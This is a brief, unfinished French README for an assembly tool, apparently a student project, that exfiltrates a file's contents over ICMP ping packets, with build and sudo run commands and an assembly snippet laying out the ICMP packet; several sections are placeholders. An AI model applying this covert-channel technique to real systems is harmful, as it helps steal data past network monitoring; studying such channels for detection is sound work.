# Exfiltration de données par ICMP

## asm_icmp_leaker

### Compilation

```
./build.sh
```

### Utilisation

doit etre lancé en sudo

```
sudo ./main 127.0.0.1 test.txt
```

### Information

Ce script va exfiltré les données du fichier passé en paramètre par ICMP. Il va lire le fichier et envoyer par ICMP le contenu du fichier découpé en plusieurs partie.
Le script va attendre une réponse ICMP pour envoyer le caractère suivant de facon a ne pas avoir de perte d'information.

### Element du code

#### Structure d'un ping

##### Nos recherches

ajout site RFC ... ...

##### Le code

```asm
address:
  dw 2
  dw 0
  db 0,0,0,0
  dd 0 
  dd 0 

packet:
  dw      0x0008
  dw      0x0000; Checksum à 0
  dw      0x000a
  dw      0x0002
  dw      0xad18
  dw      0x8c67
  dw      0x0000
  dw      0x0000

data: 
  times 24 dw 0x0000

buffer: 
  times 1024 db 0ffh

```

### Le handshake

parler du handshake

### La validation des données

attente du retour

### Possibilité d'acceleration

on peut retirer le handshake pour eviter un retour et accelerer l'envoi de donnée , mais cela enleve la validation des données

### Le serveur PYTHON

dire 2/3 truc la dessus
